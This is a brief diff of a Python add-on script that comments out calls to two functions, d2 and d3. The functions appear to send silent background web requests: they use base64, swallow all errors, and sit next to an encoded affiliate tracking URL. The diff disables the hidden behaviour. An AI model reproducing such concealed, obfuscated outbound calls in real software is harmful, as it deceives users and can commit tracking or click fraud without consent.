@@ -36,7 +36,7 @@ def d2():
 	except:
 		pass
 #aHR0cDovL2FmZmlsaWF0ZS5lbnRpcmV3ZWIuY29tL3NjcmlwdHMvY3owNm5mP2E9Y2VyZWJyb3R2JmFtcDtiPWM3ZmJiZDkzJmFtcDtkZXN0dXJsPWh0dHAlM0ElMkYlMkZjZXJlYnJvdHYuY28udWslMkZwJTJG < old        
-d2() 
+#d2() 
 
 def d3():
 	import requests,base64
@@ -45,7 +45,7 @@ def d3():
 	except:
 		pass
       
-d3() 
+#d3() 
 
 params = dict(urlparse.parse_qsl(sys.argv[2].replace('?','')))
 
